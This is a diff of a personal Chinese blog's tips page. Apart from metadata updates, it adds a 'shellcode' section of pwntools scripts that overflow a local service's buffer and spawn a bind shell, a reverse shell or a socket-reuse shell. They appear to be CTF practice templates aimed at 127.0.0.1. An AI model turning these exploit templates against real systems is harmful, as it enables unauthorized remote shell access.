@@ -9,7 +9,7 @@
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://cnitlrt.github.io/misc/" /><meta property="og:image" content="https://cnitlrt.github.io/logo.jpg"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-01-01T04:06:14+08:00" />
-<meta property="article:modified_time" content="2024-11-09T15:56:04+08:00" /><meta property="og:site_name" content="My cool site" />
+<meta property="article:modified_time" content="2024-12-04T20:51:34+08:00" /><meta property="og:site_name" content="My cool site" />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://cnitlrt.github.io/logo.jpg"/>
 
@@ -34,8 +34,8 @@
                             "url": "https:\/\/cnitlrt.github.io\/images\/Apple-Devices-Preview.png",
                             "width":  3200 ,
                             "height":  2048 
-                        }],"genre": "posts","keywords": "tools","wordcount":  20453 ,
-        "url": "https:\/\/cnitlrt.github.io\/misc\/","datePublished": "2022-01-01T04:06:14+08:00","dateModified": "2024-11-09T15:56:04+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+                        }],"genre": "posts","keywords": "tools","wordcount":  20572 ,
+        "url": "https:\/\/cnitlrt.github.io\/misc\/","datePublished": "2022-01-01T04:06:14+08:00","dateModified": "2024-12-04T20:51:34+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": {
                     "@type": "ImageObject",
@@ -113,8 +113,8 @@
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">疑难杂症宝典</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>cnitlrt</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/tools/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>tools</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-01">2022-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 20453 字&nbsp;
-                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 41 分钟&nbsp;</div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-01-01">2022-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 20572 字&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 42 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>目录</span>
@@ -146,6 +146,18 @@
                 <li><a href="#写入配置">写入配置</a></li>
                 <li><a href="#粘贴下方配置代理并wq退出">粘贴下方配置代理并wq退出</a></li>
                 <li><a href="#重启服务">重启服务</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#shellcode">shellcode</a>
+          <ul>
+            <li>
+              <ul>
+                <li><a href="#正向">正向</a></li>
+                <li><a href="#反向">反向</a></li>
+                <li><a href="#不连">不连</a></li>
+                <li><a href="#总结">总结</a></li>
               </ul>
             </li>
           </ul>
@@ -731,6 +743,107 @@
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo systemctl daemon-reload 
 </span></span><span class="line"><span class="cl">sudo systemctl restart docker
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="shellcode">shellcode</h2>
+<h4 id="正向">正向</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">context(arch=&#39;amd64&#39;,os=&#39;linux&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">io = remote(&#34;127.0.0.1&#34;,8888)
+</span></span><span class="line"><span class="cl">sc = asm(shellcraft.bindsh(4444))
+</span></span><span class="line"><span class="cl">io.send(&#39;a&#39;*40+p64(0x400698)+sc)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sh = remote(&#34;127.0.0.1&#34;,4444)
+</span></span><span class="line"><span class="cl">sh.interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="反向">反向</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">context(arch=&#39;amd64&#39;,os=&#39;linux&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sh = listen(4444)
+</span></span><span class="line"><span class="cl">io = remote(&#34;127.0.0.1&#34;,8888)
+</span></span><span class="line"><span class="cl">shellcode = asm(shellcraft.connect(&#39;127.0.0.1&#39;,4444)+shellcraft.dupsh())
+</span></span><span class="line"><span class="cl">io.send(&#39;a&#39;*40+p64(0x400698)+shellcode)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sh.wait_for_connection()
+</span></span><span class="line"><span class="cl">sh.interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="不连">不连</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">context(arch=&#39;amd64&#39;,os=&#39;linux&#39;)
+</span></span><span class="line"><span class="cl">io = remote(&#34;127.0.0.1&#34;,8888)
+</span></span><span class="line"><span class="cl">#shellcode = asm(shellcraft.dupsh(4))
+</span></span><span class="line"><span class="cl">shellcode = asm(shellcraft.findpeersh(io.lport))
+</span></span><span class="line"><span class="cl">io.send(&#39;a&#39;*40+p64(0x400698)+shellcode)
+</span></span><span class="line"><span class="cl">io.interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="总结">总结</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;127.0.0.1&#34;</span><span class="p">,</span><span class="mi">8888</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#shellcode = asm(shellcraft.sh())</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#shellcode = asm(shellcraft.amd64.linux.bindsh(4444))</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#shellcode = asm(shellcraft.connect(&#39;127.0.0.1&#39;,4444)+shellcraft.dupsh())</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#shellcode = asm(shellcraft.dupsh(4))</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#shellcode = asm(shellcraft.findpeersh(io.lport))</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">40</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400698</span><span class="p">)</span><span class="o">+</span><span class="n">shellcode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="linux使用云盘">linux使用云盘</h2>
@@ -8471,8 +8584,8 @@ seccomp-tools asm rule.asm -a amd64  -f carray</p>
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>更新于 2024-11-09&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/5f28ddec3c358cce29bca5eb19084b51ed3c2059" target="_blank" title="commit by cnitlrt(cnitlrt@gmail.com) 5f28ddec3c358cce29bca5eb19084b51ed3c2059: blog">
-                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>5f28dde</a></span>
+                <span>更新于 2024-12-04&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/14c8e453f8254786c4d0fc4770e82964baa1d608" target="_blank" title="commit by cnitlrt(1258175307@qq.com) 14c8e453f8254786c4d0fc4770e82964baa1d608: blog">
+                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>14c8e45</a></span>
             </div></div>
         <div class="post-info-line">
             <div class="post-info-md"></div>
